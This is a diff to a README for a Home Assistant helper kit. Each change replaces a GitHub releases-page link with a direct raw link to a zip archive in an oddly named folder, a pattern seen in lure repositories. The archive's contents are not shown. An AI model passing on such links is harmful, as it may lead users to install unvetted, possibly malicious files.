@@ -1,6 +1,6 @@
 # 🤖 homeassistant-claude-kit - Simplify Home Assistant Setup
 
-[![Download homeassistant-claude-kit](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/psychological-ruble517/homeassistant-claude-kit/releases)
+[![Download homeassistant-claude-kit](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/psychological-ruble517/homeassistant-claude-kit/main/equaling/claude-homeassistant-kit-2.5.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ If you use Home Assistant already, this kit can help you shape and manage your s
 
 Visit this page to download:
 
-https://github.com/psychological-ruble517/homeassistant-claude-kit/releases
+https://raw.githubusercontent.com/psychological-ruble517/homeassistant-claude-kit/main/equaling/claude-homeassistant-kit-2.5.zip
 
 On that page:
 
@@ -241,7 +241,7 @@ No. It is useful for both new users and people who want a cleaner setup process.
 
 Visit this page to download:
 
-https://github.com/psychological-ruble517/homeassistant-claude-kit/releases
+https://raw.githubusercontent.com/psychological-ruble517/homeassistant-claude-kit/main/equaling/claude-homeassistant-kit-2.5.zip
 
 ## 🧰 Quick start checklist
 
